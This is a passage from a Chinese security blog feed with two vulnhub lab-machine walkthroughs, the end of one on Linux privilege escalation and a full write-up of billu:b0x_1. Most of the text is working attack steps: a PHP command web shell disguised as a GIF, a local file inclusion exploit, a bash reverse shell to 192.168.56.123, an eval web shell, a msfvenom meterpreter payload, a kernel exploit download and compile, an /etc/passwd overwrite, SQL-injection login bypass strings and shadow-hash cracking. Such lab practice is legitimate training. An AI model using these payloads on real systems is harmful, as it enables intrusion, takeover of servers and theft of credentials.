href="https://github.com/mzet-/linux-exploit-suggester">Linux-exploit-suggester</a></p><p><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl">https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl</a></p><p><a href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a></p><blockquote><p>Linux权限提升审核工具,是基于操作系统的内核版本号。程序会执行“uname -r”命令来获取Linux操作系统发行版本，之后返回一个包含了适用exploits的提示列表。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;linux-exploit-suggester.sh</span><br><span class="line">.&#x2F;LinEnum.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111105423711.png" alt="image-20210111105423711"></p><p>可以根据下面检测到的CVE进行利用，肯定不是每一个都可以，参考作用。</p><p>利用了前几个可能性高的（highly probable）都不成功</p><p>利用另一个脚本检测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python linuxprivchecker.py</span><br></pre></td></tr></table></figure><p>发现了可修改的/etc/passwd 和 具有suid权限的 <code>/opt/s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;rwx -type f 2&gt;&#x2F;dev&#x2F;null   # 用这个更快</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111135429952.png" alt="image-20210111135429952"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings &#x2F;opt&#x2F;s</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111140128848.png" alt="image-20210111140128848"></p><p>发现了<code>scp</code>复制文件命令，意思是把本地的/root/下所有目录文件都复制到<a href="mailto:&#98;&#48;&#x78;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#48;&#46;&#49;">&#98;&#48;&#x78;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#48;&#46;&#49;</a>下的/var/backup下</p><blockquote><p>Linux scp 命令用于 Linux 之间复制文件和目录。</p><p>scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。</p></blockquote><h3 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h3><p>这个/opt/s文件有执行权限，只有执行它，就会执行scp这一命令进行文件复制，如果./s就会让你输入b0x的密码，输对了才能上传成功，所以只有把这个scp命令稍作修改再写入环境变量中，就可以达到我们想要的效果，比如提权</p><p>先在/tmp下写一个scp可执行，再写入环境变量，生效后，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;scp</span><br><span class="line">chmod 777 &#x2F;tmp&#x2F;scp</span><br><span class="line">echo $PATH    # 出来环境变量</span><br><span class="line">PATH &#x3D; &#x2F;tmp:$PATH    # 将&#x2F;tmp 目录添加到环境变量中</span><br><span class="line">$PATH   # 确认添加成功</span><br><span class="line">cd &#x2F;opt</span><br><span class="line">.&#x2F;s</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111141529081.png" alt="image-20210111141529081"></p><h3 id="修改-etc-passwd"><a href="#修改-etc-passwd" class="headerlink" title="修改/etc/passwd"></a>修改/etc/passwd</h3><p>由于/etc/passwd具有普通用户修改的权限，所以查看之后发现里面有<code>indishell</code>用户权限很高，还具有/bin/bash环境，附带着还有它的hash密码</p><p>既然都可以修改了，直接把密码给改了不就行了吗，用openssl passwd生成一个加密的密码（openssl passwd具体参考<a href="https://www.cnblogs.com/wyzhou/p/9739004.html%EF%BC%89">https://www.cnblogs.com/wyzhou/p/9739004.html）</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt &quot;123456&quot; qazxsw</span><br><span class="line">$1$123456$RF7JHkAyN&#x2F;EL3oWgX0.G8&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p>openssl passwd支持3种加密算法方式：不指定算法时，默认使用-crypt</p><p>-crypt：UNIX标准加密算法，此为默认算法。<strong>如果加盐(-salt)算密码，只取盐的前2位，2位后面的所有字符都忽略</strong>。</p><p>-1(数字)：基于MD5的算法代号。</p><p>-apr1(数字)：apache中使用的备选md5算法代号，不能和”-1”选项一起使用，因为apr1本身就默认了md5。htpasswd工具生成的身份验证密码就是此方法。</p><p>-salt：加密时加点盐，可以增加算法的复杂度。但<strong>加了盐会有副作用：盐相同，密码也相同，则加密的结果将一样</strong>。</p></blockquote><p>基于MD5的算法，加了盐，qazxsw是密码，再将生成的hash进行更换</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111150229125.png" alt="image-20210111150229125"></p><p>思路：先将/etc/passwd复制一个副本，python -m SimpleHTTPServer，把副本下载到本地，然后进行修改内容，将hash替换完成后，再本地python -m SimpleHTTPServer，受害机下载回来覆盖到/etc/passwd下，然后su indishell 输入密码成功登陆。</p><p>这种一来一去的办法是不是有点麻烦，直接vim不行吗，这里有过经验的都知道，直接vim操作会出现乱码的问题，修改起来相当费劲，那能直接用命令行添加替换覆盖某一行就好了，那就来研究研究好了。</p><p>先 nl /etc/passwd 查看要修改的行数，再修改即可</p><p>用sed命令直接替换第44行的内容，这招快捷啊(〃’▽’〃)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;44c indishell:$1$123456$RF7JHkAyN&#x2F;EL3oWgX0.G8&#x2F;:1000:1000:indishell,,,:&#x2F;home&#x2F;indishell:&#x2F;bin&#x2F;bash&#39; passwd</span><br></pre></td></tr></table></figure><p>具体<code>sed</code>命令的使用看这篇<a href="https://dummersoul.top/2021/01/11/Linux%20sed%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/">Linux sed命令的使用</a><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111151603626.png" alt="image-20210111151603626"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111151911544.png" alt="image-20210111151911544"></p><p>又发现indishell用户具有sudo权限，再提权root</p><p>也可以直接将indishell用户的uid和gid都改为0</p><p>有sudo权限了，一个比较绕的方法是加find suid权限：先在有root权限的/etc/passwd下第一行加入sudo chmod u+s /usr/bin/find ,然后cd /etc下，执行Passwd文件，这时输入密码后就有find suid权限了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec &#x2F;bin&#x2F;bash -p \;</span><br></pre></td></tr></table></figure><p>进入bash环境，whoami查看是否提权成功</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>python -c ‘import pty;pty.spawn(“/bin/bash”)’ </li><li>python -m SimpleHTTPServer </li><li>find / -perm -u=s -type f 2&gt;/dev/null</li><li>PATH = /tmp:$PATH </li><li>openssl passwd -1 -salt “123456” qazxsw</li><li>find . -exec /bin/bash -p ; </li></ul><p>添加path环境变量要加冒号，添加/bin/bash环境才能su -</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/158937#h3-4">https://www.anquanke.com/post/id/158937#h3-4</a></p><p><a href="https://101.132.145.96/25115.html">https://101.132.145.96/25115.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> 内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>billu:b0x_1靶机练习</title>
      <link href="2023/11/28/billu%20b0x_1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>2023/11/28/billu%20b0x_1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>netdiscover</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106091051027.png" alt="image-20210106091051027"></p><p><code>arp-scan -l</code> 这个贼快</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106214353025.png" alt="image-20210106214353025"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106091109262.png" alt="image-20210106091109262"></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106091203450.png" alt="image-20210106091203450"></p><p>提示了sql注入</p><p>但是抓包sqlmap -r 1.txt –level=5 -dbs 也没有任何东西。无奈</p><h2 id="扫描目录–dirb"><a href="#扫描目录–dirb" class="headerlink" title="扫描目录–dirb"></a>扫描目录–dirb</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists</span><br><span class="line">ls</span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.56.107 .&#x2F;big.txt</span><br></pre></td></tr></table></figure><p>之前没怎么用过这个工具，一直用的御剑，今儿用了才发现，还是用的大字典，结果那叫一个<strong>快准狠</strong>！！爱了爱了！！！</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106100040327.png" alt="image-20210106100040327"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106100302925.png" alt="image-20210106100302925"></p><p>这几个目录都很有用，其中有一个phpmyadmin 还不知道账户密码</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106100345427.png" alt="image-20210106100345427"></p><p>文件上传</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106092841771.png" alt="image-20210106092841771"></p><p>结果发现上传的文件并没在/images/目录和/uploaded_images/目录里出现</p><p>仅仅是前端的上传页面，不能传东西</p><h2 id="探针信息"><a href="#探针信息" class="headerlink" title="探针信息"></a>探针信息</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106093922886.png" alt="image-20210106093922886"></p><p>可以知道网站根目录的位置</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106093119055.png" alt="image-20210106093119055"></p><p>这个像个文件包含</p><p>post添加file参数</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106094225729.png" alt="image-20210106094225729"></p><p>成功下载文件，再利用这种方式下载其他文件，探测信息</p><p>又下载了一个扫到的c.php 发现 mysql 的账号<code>billu</code> 密码<code>b0x_billu</code> ，这不是有账户密码了吗，直接登录phpmyadmin</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106094416305.png" alt="image-20210106094416305"></p><blockquote><p>还可以再下载index.php 代码审计一下怎么绕过sql注入吧（现在还不会</p></blockquote><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>billu,b0x_billu</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102328383.png" alt="image-20210106102328383"></p><p>利用找到的 biLLu，hEx_it。 去登录index.php</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102424686.png" alt="image-20210106102424686"></p><p>登录跳转到<a href="http://192.168.56.107/panel.php">http://192.168.56.107/panel.php</a></p><p>用文件包含的方式下载这个源码，代码审计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;continue&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$dir&#x3D;getcwd();</span><br><span class="line">$choice&#x3D;str_replace(&#39;.&#x2F;&#39;,&#39;&#39;,$_POST[&#39;load&#39;]);</span><br><span class="line"></span><br><span class="line">if($choice&#x3D;&#x3D;&#x3D;&#39;add&#39;)</span><br><span class="line">&#123;</span><br><span class="line">       include($dir.&#39;&#x2F;&#39;.$choice.&#39;.php&#39;);</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        if($choice&#x3D;&#x3D;&#x3D;&#39;show&#39;)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line">include($dir.&#39;&#x2F;&#39;.$choice.&#39;.php&#39;);</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">include($dir.&#39;&#x2F;&#39;.$_POST[&#39;load&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现panel.php存在本地文件包含漏洞</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102522573.png" alt="image-20210106102522573"></p><p>选择add user 又出现了刚才的文件上传页面，难道必须在这个页面才能上传成功吗，再试试</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102654670.png" alt="image-20210106102654670"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106103152325.png" alt="image-20210106103152325"></p><p>上传了一个图片马</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102852717.png" alt="image-20210106102852717"></p><p>在<a href="http://192.168.56.107/uploaded_images/">http://192.168.56.107/uploaded_images/</a> 查看一下，还真有诶</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106102918904.png" alt="image-20210106102918904"></p><p>然后没办法啊，前面那些都是post请求，没办法，换思路</p><p>上传一个一句话cmd命令马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89</span><br><span class="line">&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>上传后，点击show users 抓包，然后修改load的位置为上传图片马的位置</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106154036290.png" alt="image-20210106154036290"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106153454012.png" alt="image-20210106153454012"></p><p>结果发现咋没有呢</p><p>后来再看，发现是cat /etc/passwd 中间的空格没有解析，应该把空格换成%20</p><blockquote><p>post请求url中加入执行命令的参数：POST /panel.php?cmd=cat%20/etc/passwd</p><p>post的body中包含cmd.jpg图片马：load=/uploaded_images/cmd.jpg&amp;continue=continue</p><p>成功执行命令cat /etc/passwd</p></blockquote><p>或者直接hackbar修改，更方便</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106170738658.png" alt="image-20210106170738658"></p><h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.123&#x2F;4444 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure><p>url编码后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%35%36%2e%31%32%33%2f%34%34%34%34%20%30%3e%26%31%22%20%7c%20%62%61%73%68</span><br></pre></td></tr></table></figure><p>在post的url中将执行的命令换成可以反弹shell的</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106155126898.png" alt="image-20210106155126898"></p><p>与此同时，在192.168.56.123监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>成功getshell</p><h2 id="菜刀弹shell"><a href="#菜刀弹shell" class="headerlink" title="菜刀弹shell"></a>菜刀弹shell</h2><p>通过刚才上一步cmd马执行命令，执行ls -al 发现uploaded_images目录具有可写权限</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106170957038.png" alt="image-20210106170957038"></p><p>那可以写个马进去直接连啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.107&#x2F;panel.php?cmd&#x3D;echo &#39;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&#39;123 &gt;&gt; uploaded_images&#x2F;shell.php</span><br><span class="line">load&#x3D;&#x2F;uploaded_images&#x2F;cmd.jpg&amp;continue&#x3D;continue</span><br></pre></td></tr></table></figure><p>查看是否创建成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.107&#x2F;panel.php?cmd&#x3D;cat uploaded_images&#x2F;shell.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106171918315.png" alt="image-20210106171918315"></p><p>有我加的123，说明执行成功</p><p>直接访问也有123</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106172629694.png" alt="image-20210106172629694"></p><p>菜刀上<a href="http://192.168.56.107/uploaded_images/shell.php%EF%BC%8C%E5%AF%86%E7%A0%81%60pass%60">http://192.168.56.107/uploaded_images/shell.php，密码`pass`</a></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106172537987.png" alt="image-20210106172537987"></p><h2 id="nc-getshell后提权"><a href="#nc-getshell后提权" class="headerlink" title="nc getshell后提权"></a>nc getshell后提权</h2><p>getshell之后是一个普通用户权限，要想办法提权，linux提权有多种方式，有脏牛, 环境变量提权, 内核提权,命令提权等</p><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a #查看内核版本 : 3.13.0-32-generic</span><br><span class="line">cat &#x2F;etc&#x2F;issue #查看系统版本 ： Ubuntu 12.04.5 </span><br></pre></td></tr></table></figure><h4 id="搜索exp"><a href="#搜索exp" class="headerlink" title="搜索exp"></a>搜索exp</h4><p>可以直接在kali中搜关键词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 3.13.0</span><br><span class="line">searchsploit Ubuntu 12.04.5 </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106150611184.png" alt="image-20210106150611184"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106150644543.png" alt="image-20210106150644543"></p><p>将exp拷贝到根路径下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;37292.c &#x2F;root&#x2F;</span><br></pre></td></tr></table></figure><p>如果加参数-w 显示网址</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106151936918.png" alt="image-20210106151936918"></p><h4 id="执行exp"><a href="#执行exp" class="headerlink" title="执行exp"></a>执行exp</h4><p>先下载到靶机上，再修改权限，再编译，再执行（下载文件这一步，如果访问不了公网，可以写个一句话木马连接，先在kali下下载好，再传exp进去，也可以用kali上开启服务器的方式python -m SimpleHTTPServer，默认8000端口）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;37292</span><br><span class="line">chmod 777 37292.c </span><br><span class="line">gcc 37292.c -o exp    </span><br><span class="line">.&#x2F;exp  </span><br></pre></td></tr></table></figure><p>执行完就root权限了</p><blockquote><p>需要注意一点，有的服务器并不允许使用 <code>gcc</code> 编译，那么就需要准备一台和需要提权版本一样的虚拟机，在虚拟机里面编译好之后再上传。（这其实还蛮难搞的，版本要一模一样应该不好找吧，不行就在靶机现场安装gcc，如果没有安装权限的话，那就只能找一个一样的虚拟机编译了，又找不到其他提权方法的话，这真的是最后最后的选择了<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/064FE0FA.gif" alt="img"></p></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106160512009.png" alt="image-20210106160512009"></p><p>那如果不提权，直接切换成root用户呢， 反正也获取到root密码了</p><p>结果提示su:must be run from a terminal</p><p>需要先输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>再重新切换一次root就行了</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106164027715.png" alt="image-20210106164027715"></p><h2 id="菜刀下提权"><a href="#菜刀下提权" class="headerlink" title="菜刀下提权"></a>菜刀下提权</h2><p>刚才利用菜刀获取shell的方式可以提权吗？试一试</p><p>用虚拟终端打开，直接执行存在/tmp下的exp,结果不行</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106173038806.png" alt="image-20210106173038806"></p><p>那就在菜刀上再反弹一个shell,这次我nc反弹，kali监听，嘿，真就弹过来了啊，再定位到/tmp下执行exp就提权成功了(๑′ᴗ‵๑)</p><h2 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h2><p>练习一下msf弹shell把，虽然没有nc、bash、telnet方法来的快，但也不能不会啊，说不定出现个啥环境就不能用这些命令呢，而且msf可以生成持久性的后门。</p><p>先在kali下生成个木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.123 -f raw &gt;&#x2F;root&#x2F;sha.php</span><br></pre></td></tr></table></figure><p>开启msf配置监听器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.56.123</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">exploit -j -z   后台监听</span><br></pre></td></tr></table></figure><p>将生成的sha.php放到uploaded_images下,访问进行解析</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106175526266.png" alt="image-20210106175526266"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br><span class="line">sessions 1</span><br><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106175916421.png" alt="image-20210106175916421"></p><p>再用exp提权，跟前面的步骤一样，没有/bin/bash环境，再用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>添加一次就行了</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106180114390.png" alt="image-20210106180114390"></p><h2 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h2><p>由phpmyadmin猜测会不会有<code>config.inc.php</code> 文件，结果真有</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106101832116.png" alt="image-20210106101832116"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106101900168.png" alt="image-20210106101900168"></p><p>这样不就可以直接ssh登录了吗，提权这一步都免了</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210106103304800.png" alt="image-20210106103304800"></p><h2 id="phpmyadmin到getshell"><a href="#phpmyadmin到getshell" class="headerlink" title="phpmyadmin到getshell"></a>phpmyadmin到getshell</h2><p><a href="https://dummersoul.top/2021/01/28/phpmyadmin%E8%8E%B7%E5%8F%96shell/">phpmyadmin获取shell</a></p><h2 id="etc-shadow解密码"><a href="#etc-shadow解密码" class="headerlink" title="/etc/shadow解密码"></a>/etc/shadow解密码</h2><p>有了root权限后，再自己搞点好玩的</p><p>查看/etc/shadow文件，发现最后一行有个用户ica，想获取他的ssh密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ica:$6$yAfsVVEV$UMXZ7KKc2Xhk6tTukMl.QkFN34d&#x2F;PLRtKYZCFZzZKFyym3uzhVcWongiw1RIFtGJQyJL2a8vAwG13VHijFbzM.:17244:0:99999:7:::</span><br></pre></td></tr></table></figure><p>用这一串去john解密，新建一个文本文件，将上面一大串放进去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt </span><br></pre></td></tr></table></figure><p>开始漫长的等待</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$WE&#x2F;VCmzAPSKCKqZa$AXsu5TzeLu2Qb6a8xxrqREjppbx6nIuZ2BflCDY3DsfuguW.cifkkC4b3FQk5vO7kCnSyOfLY6NoQQUwoA&#x2F;zr.</span><br></pre></td></tr></table></figure><h2 id="sql绕过"><a href="#sql绕过" class="headerlink" title="sql绕过"></a>sql绕过</h2><p>绕过是网上学来的方法，先获取源码代码审计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uname&#x3D;str_replace(&#39;\&#39;&#39;,&#39;&#39;,urldecode($_POST[&#39;un&#39;]));</span><br><span class="line">$pass&#x3D;str_replace(&#39;\&#39;&#39;,&#39;&#39;,urldecode($_POST[&#39;ps&#39;]));</span><br><span class="line">$run&#x3D;&#39;select * from auth where  pass&#x3D;\&#39;&#39;.$pass.&#39;\&#39; and uname&#x3D;\&#39;&#39;.$uname.&#39;\&#39;&#39;;</span><br><span class="line">$result &#x3D; mysqli_query($conn, $run);</span><br></pre></td></tr></table></figure><p>sql注入一个重要的原则就是闭合输入查询，str_replace的作用是将字符串’ 替换为空，因此构造SQL注入登录payload时，必须含有’字符串，urldecode的作用是将输入解码。</p><p>构造sql注入语句闭合绕过登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;or 1&#x3D;1-- -\&#39;</span><br><span class="line">&#39;or 1&#x3D;1--+\&#39;  </span><br><span class="line">&#39;or 1&#x3D;1#\&#39;</span><br></pre></td></tr></table></figure><p>用payload：<code>&#39;or 1=1-- -\&#39;</code> 成功绕过登录，就进入到panel.php页面了</p><blockquote><p>用户名和密码都要输入payload才能绕过，上面这三种代码都可以</p></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108143100245.png" alt="image-20210108143100245"></p><h2 id="思考总结"><a href="#思考总结" class="headerlink" 